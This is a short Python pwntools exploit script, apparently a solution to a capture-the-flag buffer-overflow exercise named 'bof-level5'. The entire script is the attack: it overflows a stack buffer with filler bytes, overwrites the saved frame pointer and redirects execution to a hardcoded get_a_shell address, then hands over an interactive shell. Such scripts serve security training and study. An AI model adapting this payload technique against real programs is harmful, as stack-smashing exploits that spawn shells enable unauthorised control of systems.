#!/usr/bin/env python
from pwn import *

context.terminal = "/bin/bash"
p = process('./bof-level5')
c = Core('core')
#gdb.attach(p)

#bottom of stack
target_ebp_value = p32(0xffffc4a8)

#get_a_shell_address
addr_shell = p32(0x80484cb)

buf = 'BBBB' + addr_shell + 'A' * (0x80 - 8) + target_ebp_value

stack_addr = c.stack.find(buf)

#print(buf)
p.sendline(buf)
p.interactive()
